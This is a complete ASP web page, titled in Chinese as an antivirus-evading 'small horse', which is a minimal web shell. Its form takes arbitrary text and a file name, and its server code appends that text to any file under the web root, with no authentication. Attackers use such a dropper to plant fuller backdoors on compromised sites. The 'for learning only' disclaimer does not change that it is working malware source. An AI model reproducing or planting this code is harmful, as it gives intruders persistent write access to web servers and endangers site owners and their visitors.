<TITLE>ASP专用全免小马</TITLE>
<form method="post" action="?action=set">
  <label>  地址列表：<br />
  <br />
  <textarea name="Text" cols="50" rows="10" id="Text"></textarea>
  </label><br><font color=red>问文件仅供学习使用，如果发现威胁文件，请到<a href="http://www.tosec.cn" title="网站安全">Tosec.cn</a>解除你的危险状况</font>
  <br />
  <br />
  <label>文件名：<br />
  <br />
    <input name="FileName" type="text" id="FileName" size="20" maxlength="50" />
    <br />
    <br />
  </label>
  <label> 
    <input type="submit" name="Submit" value="保存" />
   </label>
</form>
<%
dim s
if request("action")="set" then
Text=request("Text")
FileName=request("FileName")
set fs=server.CreateObject("Scripting.FileSystemObject")
set file=fs.OpenTextFile(server.MapPath(FileName),8,True)
file.writeline Text
file.close
set file=nothing
set fs=nothing
response.write ("<script>alert('保存成功！')</script>") 
end if
%>